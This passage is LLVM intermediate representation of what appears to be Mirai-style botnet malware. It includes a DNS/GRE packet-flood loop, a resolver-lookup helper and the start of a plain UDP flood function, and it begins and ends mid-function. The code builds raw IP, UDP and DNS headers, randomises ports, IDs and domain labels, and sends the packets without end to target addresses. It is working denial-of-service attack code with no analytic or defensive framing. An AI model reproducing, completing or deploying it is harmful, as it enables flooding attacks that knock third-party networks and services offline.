  %90 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* %89, i32 4) #6
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

; <label>:92:                                     ; preds = %87
  %93 = load i32, i32* %10, align 4
  %94 = call i32 @close(i32 %93)
  br label %396

; <label>:95:                                     ; preds = %87
  store i32 0, i32* %9, align 4
  br label %96

; <label>:96:                                     ; preds = %257, %95
  %97 = load i32, i32* %9, align 4
  %98 = load i8, i8* %5, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  br i1 %100, label %101, label %260

; <label>:101:                                    ; preds = %96
  store i8 0, i8* %24, align 1
  store i8 0, i8* %25, align 1
  %102 = call noalias i8* @calloc(i64 600, i64 1) #6
  %103 = load i8**, i8*** %11, align 8
  %104 = load i32, i32* %9, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8*, i8** %103, i64 %105
  store i8* %102, i8** %106, align 8
  %107 = load i8**, i8*** %11, align 8
  %108 = load i32, i32* %9, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  %111 = load i8*, i8** %110, align 8
  %112 = bitcast i8* %111 to %struct.iphdr*
  store %struct.iphdr* %112, %struct.iphdr** %26, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i64 1
  %115 = bitcast %struct.iphdr* %114 to %struct.udphdr*
  store %struct.udphdr* %115, %struct.udphdr** %27, align 8
  %116 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %117 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %116, i64 1
  %118 = bitcast %struct.udphdr* %117 to %struct.dnshdr*
  store %struct.dnshdr* %118, %struct.dnshdr** %28, align 8
  %119 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %120 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %119, i64 1
  %121 = bitcast %struct.dnshdr* %120 to i8*
  store i8* %121, i8** %29, align 8
  %122 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %123 = bitcast %struct.iphdr* %122 to i8*
  %124 = load i8, i8* %123, align 4
  %125 = and i8 %124, 15
  %126 = or i8 %125, 64
  store i8 %126, i8* %123, align 4
  %127 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %128 = bitcast %struct.iphdr* %127 to i8*
  %129 = load i8, i8* %128, align 4
  %130 = and i8 %129, -16
  %131 = or i8 %130, 5
  store i8 %131, i8* %128, align 4
  %132 = load i8, i8* %12, align 1
  %133 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %134 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %133, i32 0, i32 1
  store i8 %132, i8* %134, align 1
  %135 = load i8, i8* %19, align 1
  %136 = zext i8 %135 to i64
  %137 = add i64 41, %136
  %138 = add i64 %137, 2
  %139 = load i32, i32* %21, align 4
  %140 = sext i32 %139 to i64
  %141 = add i64 %138, %140
  %142 = add i64 %141, 4
  %143 = trunc i64 %142 to i16
  %144 = call zeroext i16 @htons(i16 zeroext %143) #7
  %145 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 2
  store i16 %144, i16* %146, align 2
  %147 = load i16, i16* %13, align 2
  %148 = call zeroext i16 @htons(i16 zeroext %147) #7
  %149 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 3
  store i16 %148, i16* %150, align 4
  %151 = load i8, i8* %14, align 1
  %152 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 5
  store i8 %151, i8* %153, align 4
  %154 = load i8, i8* %15, align 1
  %155 = icmp ne i8 %154, 0
  br i1 %155, label %156, label %160

; <label>:156:                                    ; preds = %101
  %157 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %158 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 4
  store i16 %157, i16* %159, align 2
  br label %160

; <label>:160:                                    ; preds = %156, %101
  %161 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 6
  store i8 17, i8* %162, align 1
  %163 = load i32, i32* @LOCAL_ADDR, align 4
  %164 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 8
  store i32 %163, i32* %165, align 4
  %166 = load i32, i32* %22, align 4
  %167 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 9
  store i32 %166, i32* %168, align 4
  %169 = load i16, i16* %16, align 2
  %170 = call zeroext i16 @htons(i16 zeroext %169) #7
  %171 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %172 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %171, i32 0, i32 0
  store i16 %170, i16* %172, align 2
  %173 = load i16, i16* %17, align 2
  %174 = call zeroext i16 @htons(i16 zeroext %173) #7
  %175 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %176 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %175, i32 0, i32 1
  store i16 %174, i16* %176, align 2
  %177 = load i8, i8* %19, align 1
  %178 = zext i8 %177 to i64
  %179 = add i64 21, %178
  %180 = add i64 %179, 2
  %181 = load i32, i32* %21, align 4
  %182 = sext i32 %181 to i64
  %183 = add i64 %180, %182
  %184 = add i64 %183, 4
  %185 = trunc i64 %184 to i16
  %186 = call zeroext i16 @htons(i16 zeroext %185) #7
  %187 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %188 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %187, i32 0, i32 2
  store i16 %186, i16* %188, align 2
  %189 = load i16, i16* %18, align 2
  %190 = call zeroext i16 @htons(i16 zeroext %189) #7
  %191 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %192 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %191, i32 0, i32 0
  store i16 %190, i16* %192, align 2
  %193 = call zeroext i16 @htons(i16 zeroext 256) #7
  %194 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %195 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %194, i32 0, i32 1
  store i16 %193, i16* %195, align 2
  %196 = call zeroext i16 @htons(i16 zeroext 1) #7
  %197 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %198 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %197, i32 0, i32 2
  store i16 %196, i16* %198, align 2
  %199 = load i8, i8* %19, align 1
  %200 = load i8*, i8** %29, align 8
  %201 = getelementptr inbounds i8, i8* %200, i32 1
  store i8* %201, i8** %29, align 8
  store i8 %199, i8* %200, align 1
  %202 = load i8, i8* %19, align 1
  %203 = zext i8 %202 to i32
  %204 = load i8*, i8** %29, align 8
  %205 = sext i32 %203 to i64
  %206 = getelementptr inbounds i8, i8* %204, i64 %205
  store i8* %206, i8** %29, align 8
  %207 = load i8*, i8** %29, align 8
  store i8* %207, i8** %30, align 8
  %208 = load i8*, i8** %29, align 8
  %209 = getelementptr inbounds i8, i8* %208, i64 1
  %210 = load i8*, i8** %20, align 8
  %211 = load i32, i32* %21, align 4
  %212 = add nsw i32 %211, 1
  call void @util_memcpy(i8* %209, i8* %210, i32 %212)
  store i32 0, i32* %23, align 4
  br label %213

; <label>:213:                                    ; preds = %239, %160
  %214 = load i32, i32* %23, align 4
  %215 = load i32, i32* %21, align 4
  %216 = icmp slt i32 %214, %215
  br i1 %216, label %217, label %242

; <label>:217:                                    ; preds = %213
  %218 = load i8*, i8** %20, align 8
  %219 = load i32, i32* %23, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds i8, i8* %218, i64 %220
  %222 = load i8, i8* %221, align 1
  %223 = sext i8 %222 to i32
  %224 = icmp eq i32 %223, 46
  br i1 %224, label %225, label %235

; <label>:225:                                    ; preds = %217
  %226 = load i8, i8* %24, align 1
  %227 = load i8*, i8** %30, align 8
  store i8 %226, i8* %227, align 1
  store i8 0, i8* %24, align 1
  %228 = load i8, i8* %25, align 1
  %229 = add i8 %228, 1
  store i8 %229, i8* %25, align 1
  %230 = load i8*, i8** %29, align 8
  %231 = load i32, i32* %23, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds i8, i8* %230, i64 %232
  %234 = getelementptr inbounds i8, i8* %233, i64 1
  store i8* %234, i8** %30, align 8
  br label %238

; <label>:235:                                    ; preds = %217
  %236 = load i8, i8* %24, align 1
  %237 = add i8 %236, 1
  store i8 %237, i8* %24, align 1
  br label %238

; <label>:238:                                    ; preds = %235, %225
  br label %239

; <label>:239:                                    ; preds = %238
  %240 = load i32, i32* %23, align 4
  %241 = add nsw i32 %240, 1
  store i32 %241, i32* %23, align 4
  br label %213

; <label>:242:                                    ; preds = %213
  %243 = load i8, i8* %24, align 1
  %244 = load i8*, i8** %30, align 8
  store i8 %243, i8* %244, align 1
  %245 = load i8*, i8** %29, align 8
  %246 = load i32, i32* %21, align 4
  %247 = sext i32 %246 to i64
  %248 = getelementptr inbounds i8, i8* %245, i64 %247
  %249 = getelementptr inbounds i8, i8* %248, i64 2
  %250 = bitcast i8* %249 to %struct.grehdr*
  store %struct.grehdr* %250, %struct.grehdr** %31, align 8
  %251 = call zeroext i16 @htons(i16 zeroext 1) #7
  %252 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %253 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %252, i32 0, i32 0
  store i16 %251, i16* %253, align 2
  %254 = call zeroext i16 @htons(i16 zeroext 1) #7
  %255 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %256 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %255, i32 0, i32 1
  store i16 %254, i16* %256, align 2
  br label %257

; <label>:257:                                    ; preds = %242
  %258 = load i32, i32* %9, align 4
  %259 = add nsw i32 %258, 1
  store i32 %259, i32* %9, align 4
  br label %96

; <label>:260:                                    ; preds = %96
  br label %261

; <label>:261:                                    ; preds = %395, %260
  store i32 0, i32* %9, align 4
  br label %262

; <label>:262:                                    ; preds = %392, %261
  %263 = load i32, i32* %9, align 4
  %264 = load i8, i8* %5, align 1
  %265 = zext i8 %264 to i32
  %266 = icmp slt i32 %263, %265
  br i1 %266, label %267, label %395

; <label>:267:                                    ; preds = %262
  %268 = load i8**, i8*** %11, align 8
  %269 = load i32, i32* %9, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds i8*, i8** %268, i64 %270
  %272 = load i8*, i8** %271, align 8
  store i8* %272, i8** %32, align 8
  %273 = load i8*, i8** %32, align 8
  %274 = bitcast i8* %273 to %struct.iphdr*
  store %struct.iphdr* %274, %struct.iphdr** %33, align 8
  %275 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %276 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %275, i64 1
  %277 = bitcast %struct.iphdr* %276 to %struct.udphdr*
  store %struct.udphdr* %277, %struct.udphdr** %34, align 8
  %278 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %279 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %278, i64 1
  %280 = bitcast %struct.udphdr* %279 to %struct.dnshdr*
  store %struct.dnshdr* %280, %struct.dnshdr** %35, align 8
  %281 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %282 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %281, i64 1
  %283 = bitcast %struct.dnshdr* %282 to i8*
  %284 = getelementptr inbounds i8, i8* %283, i64 1
  store i8* %284, i8** %36, align 8
  %285 = load i16, i16* %13, align 2
  %286 = zext i16 %285 to i32
  %287 = icmp eq i32 %286, 65535
  br i1 %287, label %288, label %294

; <label>:288:                                    ; preds = %267
  %289 = call i32 @rand_next()
  %290 = and i32 %289, 65535
  %291 = trunc i32 %290 to i16
  %292 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %293 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %292, i32 0, i32 3
  store i16 %291, i16* %293, align 4
  br label %294

; <label>:294:                                    ; preds = %288, %267
  %295 = load i16, i16* %16, align 2
  %296 = zext i16 %295 to i32
  %297 = icmp eq i32 %296, 65535
  br i1 %297, label %298, label %304

; <label>:298:                                    ; preds = %294
  %299 = call i32 @rand_next()
  %300 = and i32 %299, 65535
  %301 = trunc i32 %300 to i16
  %302 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %303 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %302, i32 0, i32 0
  store i16 %301, i16* %303, align 2
  br label %304

; <label>:304:                                    ; preds = %298, %294
  %305 = load i16, i16* %17, align 2
  %306 = zext i16 %305 to i32
  %307 = icmp eq i32 %306, 65535
  br i1 %307, label %308, label %314

; <label>:308:                                    ; preds = %304
  %309 = call i32 @rand_next()
  %310 = and i32 %309, 65535
  %311 = trunc i32 %310 to i16
  %312 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %313 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %312, i32 0, i32 1
  store i16 %311, i16* %313, align 2
  br label %314

; <label>:314:                                    ; preds = %308, %304
  %315 = load i16, i16* %18, align 2
  %316 = zext i16 %315 to i32
  %317 = icmp eq i32 %316, 65535
  br i1 %317, label %318, label %324

; <label>:318:                                    ; preds = %314
  %319 = call i32 @rand_next()
  %320 = and i32 %319, 65535
  %321 = trunc i32 %320 to i16
  %322 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %323 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %322, i32 0, i32 0
  store i16 %321, i16* %323, align 2
  br label %324

; <label>:324:                                    ; preds = %318, %314
  %325 = load i8*, i8** %36, align 8
  %326 = load i8, i8* %19, align 1
  %327 = zext i8 %326 to i32
  call void @rand_alphastr(i8* %325, i32 %327)
  %328 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %329 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %328, i32 0, i32 7
  store i16 0, i16* %329, align 2
  %330 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %331 = bitcast %struct.iphdr* %330 to i16*
  %332 = call zeroext i16 @checksum_generic(i16* %331, i32 20)
  %333 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %334 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %333, i32 0, i32 7
  store i16 %332, i16* %334, align 2
  %335 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %336 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %335, i32 0, i32 3
  store i16 0, i16* %336, align 2
  %337 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %338 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %339 = bitcast %struct.udphdr* %338 to i8*
  %340 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %341 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %340, i32 0, i32 2
  %342 = load i16, i16* %341, align 2
  %343 = load i8, i8* %19, align 1
  %344 = zext i8 %343 to i64
  %345 = add i64 21, %344
  %346 = add i64 %345, 2
  %347 = load i32, i32* %21, align 4
  %348 = sext i32 %347 to i64
  %349 = add i64 %346, %348
  %350 = add i64 %349, 4
  %351 = trunc i64 %350 to i32
  %352 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %337, i8* %339, i16 zeroext %342, i32 %351)
  %353 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %354 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %353, i32 0, i32 3
  store i16 %352, i16* %354, align 2
  %355 = load i32, i32* %22, align 4
  %356 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %357 = load i32, i32* %9, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %356, i64 %358
  %360 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %359, i32 0, i32 0
  %361 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %360, i32 0, i32 2
  %362 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %361, i32 0, i32 0
  store i32 %355, i32* %362, align 4
  %363 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %364 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %363, i32 0, i32 1
  %365 = load i16, i16* %364, align 2
  %366 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %367 = load i32, i32* %9, align 4
  %368 = sext i32 %367 to i64
  %369 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %366, i64 %368
  %370 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %369, i32 0, i32 0
  %371 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %370, i32 0, i32 1
  store i16 %365, i16* %371, align 2
  %372 = load i32, i32* %10, align 4
  %373 = load i8*, i8** %32, align 8
  %374 = load i8, i8* %19, align 1
  %375 = zext i8 %374 to i64
  %376 = add i64 41, %375
  %377 = add i64 %376, 2
  %378 = load i32, i32* %21, align 4
  %379 = sext i32 %378 to i64
  %380 = add i64 %377, %379
  %381 = add i64 %380, 4
  %382 = bitcast %union.__CONST_SOCKADDR_ARG* %37 to %struct.sockaddr**
  %383 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %384 = load i32, i32* %9, align 4
  %385 = sext i32 %384 to i64
  %386 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %383, i64 %385
  %387 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %386, i32 0, i32 0
  %388 = bitcast %struct.sockaddr_in* %387 to %struct.sockaddr*
  store %struct.sockaddr* %388, %struct.sockaddr** %382, align 8
  %389 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %37, i32 0, i32 0
  %390 = load %struct.sockaddr*, %struct.sockaddr** %389, align 8
  %391 = call i64 @sendto(i32 %372, i8* %373, i64 %381, i32 16384, %struct.sockaddr* %390, i32 16)
  br label %392

; <label>:392:                                    ; preds = %324
  %393 = load i32, i32* %9, align 4
  %394 = add nsw i32 %393, 1
  store i32 %394, i32* %9, align 4
  br label %262

; <label>:395:                                    ; preds = %262
  br label %261

; <label>:396:                                    ; preds = %92, %86, %80
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca [32 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  call void @table_unlock_val(i8 zeroext 30)
  %11 = call i8* @table_retrieve_val(i32 30, i32* null)
  %12 = call i32 (i8*, i32, ...) @open(i8* %11, i32 0)
  store i32 %12, i32* %2, align 4
  call void @table_lock_val(i8 zeroext 30)
  %13 = load i32, i32* %2, align 4
  %14 = icmp sge i32 %13, 0
  br i1 %14, label %15, label %95

; <label>:15:                                     ; preds = %0
  %16 = load i32, i32* %2, align 4
  %17 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %18 = call i64 @read(i32 %16, i8* %17, i64 2048)
  %19 = trunc i64 %18 to i32
  store i32 %19, i32* %3, align 4
  %20 = load i32, i32* %2, align 4
  %21 = call i32 @close(i32 %20)
  call void @table_unlock_val(i8 zeroext 31)
  %22 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %23 = load i32, i32* %3, align 4
  %24 = call i8* @table_retrieve_val(i32 31, i32* null)
  %25 = call i32 @util_stristr(i8* %22, i32 %23, i8* %24)
  store i32 %25, i32* %4, align 4
  call void @table_lock_val(i8 zeroext 31)
  %26 = load i32, i32* %4, align 4
  %27 = icmp ne i32 %26, -1
  br i1 %27, label %28, label %94

; <label>:28:                                     ; preds = %15
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %29 = load i32, i32* %4, align 4
  store i32 %29, i32* %6, align 4
  br label %30

; <label>:30:                                     ; preds = %84, %28
  %31 = load i32, i32* %6, align 4
  %32 = load i32, i32* %3, align 4
  %33 = icmp slt i32 %31, %32
  br i1 %33, label %34, label %87

; <label>:34:                                     ; preds = %30
  %35 = load i32, i32* %6, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %36
  %38 = load i8, i8* %37, align 1
  store i8 %38, i8* %10, align 1
  %39 = load i8, i8* %8, align 1
  %40 = icmp ne i8 %39, 0
  br i1 %40, label %52, label %41

; <label>:41:                                     ; preds = %34
  %42 = load i8, i8* %10, align 1
  %43 = sext i8 %42 to i32
  %44 = icmp eq i32 %43, 32
  br i1 %44, label %49, label %45

; <label>:45:                                     ; preds = %41
  %46 = load i8, i8* %10, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 9
  br i1 %48, label %49, label %50

; <label>:49:                                     ; preds = %45, %41
  br label %84

; <label>:50:                                     ; preds = %45
  store i8 1, i8* %8, align 1
  br label %51

; <label>:51:                                     ; preds = %50
  br label %52

; <label>:52:                                     ; preds = %51, %34
  %53 = load i8, i8* %10, align 1
  %54 = sext i8 %53 to i32
  %55 = icmp ne i32 %54, 46
  br i1 %55, label %56, label %64

; <label>:56:                                     ; preds = %52
  %57 = load i8, i8* %10, align 1
  %58 = sext i8 %57 to i32
  %59 = icmp slt i32 %58, 48
  br i1 %59, label %69, label %60

; <label>:60:                                     ; preds = %56
  %61 = load i8, i8* %10, align 1
  %62 = sext i8 %61 to i32
  %63 = icmp sgt i32 %62, 57
  br i1 %63, label %69, label %64

; <label>:64:                                     ; preds = %60, %52
  %65 = load i32, i32* %6, align 4
  %66 = load i32, i32* %3, align 4
  %67 = sub nsw i32 %66, 1
  %68 = icmp eq i32 %65, %67
  br i1 %68, label %69, label %83

; <label>:69:                                     ; preds = %64, %60, %56
  %70 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %71 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %72 = load i32, i32* %4, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds i8, i8* %71, i64 %73
  %75 = load i32, i32* %6, align 4
  %76 = load i32, i32* %4, align 4
  %77 = sub nsw i32 %75, %76
  call void @util_memcpy(i8* %70, i8* %74, i32 %77)
  %78 = load i32, i32* %6, align 4
  %79 = load i32, i32* %4, align 4
  %80 = sub nsw i32 %78, %79
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %81
  store i8 0, i8* %82, align 1
  store i8 1, i8* %9, align 1
  br label %87

; <label>:83:                                     ; preds = %64
  br label %84

; <label>:84:                                     ; preds = %83, %49
  %85 = load i32, i32* %6, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %6, align 4
  br label %30

; <label>:87:                                     ; preds = %69, %30
  %88 = load i8, i8* %9, align 1
  %89 = icmp ne i8 %88, 0
  br i1 %89, label %90, label %93

; <label>:90:                                     ; preds = %87
  %91 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %92 = call i32 @inet_addr(i8* %91) #6
  store i32 %92, i32* %1, align 4
  br label %106

; <label>:93:                                     ; preds = %87
  br label %94

; <label>:94:                                     ; preds = %93, %15
  br label %95

; <label>:95:                                     ; preds = %94, %0
  %96 = call i32 @rand_next()
  %97 = urem i32 %96, 4
  switch i32 %97, label %106 [
    i32 0, label %98
    i32 1, label %100
    i32 2, label %102
    i32 3, label %104
  ]

; <label>:98:                                     ; preds = %95
  %99 = call i32 @htonl(i32 134744072) #7
  store i32 %99, i32* %1, align 4
  br label %106

; <label>:100:                                    ; preds = %95
  %101 = call i32 @htonl(i32 1246898730) #7
  store i32 %101, i32* %1, align 4
  br label %106

; <label>:102:                                    ; preds = %95
  %103 = call i32 @htonl(i32 1074151430) #7
  store i32 %103, i32* %1, align 4
  br label %106

; <label>:104:                                    ; preds = %95
  %105 = call i32 @htonl(i32 67240450) #7
  store i32 %105, i32* %1, align 4
  br label %106

; <label>:106:                                    ; preds = %104, %102, %100, %98, %95, %90
  %107 = load i32, i32* %1, align 4
  ret i32 %107
}

declare i32 @open(i8*, i32, ...) #3

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_plain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 512)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

; <label>:51:                                     ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %57

; <label>:54:                                     ; preds = %4
  %55 = load i16, i16* %13, align 2
  %56 = call zeroext i16 @htons(i16 zeroext %55) #7
  store i16 %56, i16* %13, align 2
  br label %57

; <label>:57:                                     ; preds = %54, %51
  store i32 0, i32* %9, align 4
  br label %58

; <label>:58:                                     ; preds = %170, %57
  %59 = load i32, i32* %9, align 4
  %60 = load i8, i8* %5, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %173

; <label>:63:                                     ; preds = %58
  %64 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %65 = load i8**, i8*** %10, align 8
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8*, i8** %65, i64 %67
  store i8* %64, i8** %68, align 8
  %69 = load i16, i16* %12, align 2
  %70 = zext i16 %69 to i32
  %71 = icmp eq i32 %70, 65535
  br i1 %71, label %72, label %81

; <label>:72:                                     ; preds = %63
  %73 = call i32 @rand_next()
  %74 = trunc i32 %73 to i16
  %75 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %75, i64 %77
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i32 0, i32 0
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %79, i32 0, i32 1
  store i16 %74, i16* %80, align 2
  br label %90

; <label>:81:                                     ; preds = %63
  %82 = load i16, i16* %12, align 2
  %83 = call zeroext i16 @htons(i16 zeroext %82) #7
  %84 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 0
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %88, i32 0, i32 1
